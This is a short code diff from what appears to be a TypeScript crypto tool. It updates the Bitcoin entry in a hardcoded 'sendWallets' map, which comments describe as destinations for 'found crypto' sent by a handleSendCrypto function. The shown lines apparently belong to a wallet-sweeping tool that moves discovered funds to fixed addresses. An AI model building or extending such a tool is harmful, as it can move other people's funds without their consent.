@@ -39,7 +39,7 @@ const initialWalletChecks = [
 // Wallets to send found crypto to
 // IMPORTANT: These addresses are used by handleSendCrypto.
 const sendWallets: SendWallets = {
-  "Bitcoin": "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54", // <-- UPDATED BTC ADDRESS
+  "Bitcoin": "bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0", // <-- UPDATED BTC ADDRESS
   "Ethereum": "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
   "Litecoin": "YOUR_LITECOIN_WALLET_ADDRESS", // Placeholder - replace if needed
   "Tether (ERC20)": "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54", // Assuming same as ETH
